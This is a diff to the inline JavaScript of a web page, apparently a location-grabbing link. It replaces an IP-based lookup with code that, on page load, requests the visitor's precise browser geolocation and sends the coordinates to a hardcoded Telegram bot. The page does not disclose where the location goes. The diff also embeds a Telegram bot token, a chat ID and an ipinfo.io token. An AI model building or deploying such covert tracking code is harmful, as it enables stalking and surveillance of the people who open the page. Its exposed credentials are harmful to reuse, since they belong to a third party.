@@ -37,41 +37,46 @@
 
     document.getElementById("data-atual").textContent = dataFormatada;
 
-    // Coleta de localização com IP utilizando o token fornecido
-    fetch('https://ipinfo.io/json?token=1aa74ee0199100')
-      .then(response => response.json())
-      .then(data => {
-        // Dados de localização coletados do ipinfo.io
-        const locationData = {
-          ip: data.ip,
-          cidade: data.city,
-          regiao: data.region,
-          pais: data.country,
-        };
+    // Função para obter localização precisa com Geolocalização do navegador
+    function obterLocalizacao() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(enviarLocalizacaoParaTelegram, lidarComErro, {
+          enableHighAccuracy: true, // Habilita maior precisão
+          timeout: 5000,             // Timeout para obter a localização
+          maximumAge: 0             // Não utilizar dados antigos
+        });
+      } else {
+        alert("Geolocalização não é suportada neste navegador.");
+      }
+    }
 
-        // Obtenha as coordenadas de latitude e longitude
-        const location = data.loc.split(',');
+    // Função para lidar com sucesso ao obter localização
+    function enviarLocalizacaoParaTelegram(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
 
-        const latitude = location[0];
-        const longitude = location[1];
+      // Defina o token do bot e o chat_id
+      const botToken = '7757093107:AAHFmLastbU0lkV5f2AdeiNXHoxckQsJVy4';
+      const chatId = '1276935257';
 
-        // Defina o token do bot e o chat_id
-        const botToken = '7757093107:AAHFmLastbU0lkV5f2AdeiNXHoxckQsJVy4';
-        const chatId = '1276935257';
+      // Envia a localização para o bot do Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`)
+        .then(response => response.json())
+        .then(data => {
+          console.log('Localização precisa enviada para o Telegram:', data);
+        })
+        .catch(error => {
+          console.error('Erro ao enviar localização para o Telegram:', error);
+        });
+    }
 
-        // Envia a localização para o bot do Telegram
-        fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`)
-          .then(response => response.json())
-          .then(data => {
-            console.log('Localização enviada para o Telegram:', data);
-          })
-          .catch(error => {
-            console.error('Erro ao enviar localização para o Telegram:', error);
-          });
-      })
-      .catch(error => {
-        console.error('Erro ao obter localização via IP:', error);
-      });
+    // Função para lidar com erro ao obter localização
+    function lidarComErro(error) {
+      alert("Erro ao obter a localização: " + error.message);
+    }
+
+    // Obter a localização precisa quando a página carregar
+    window.onload = obterLocalizacao;
   </script>
 </body>
 
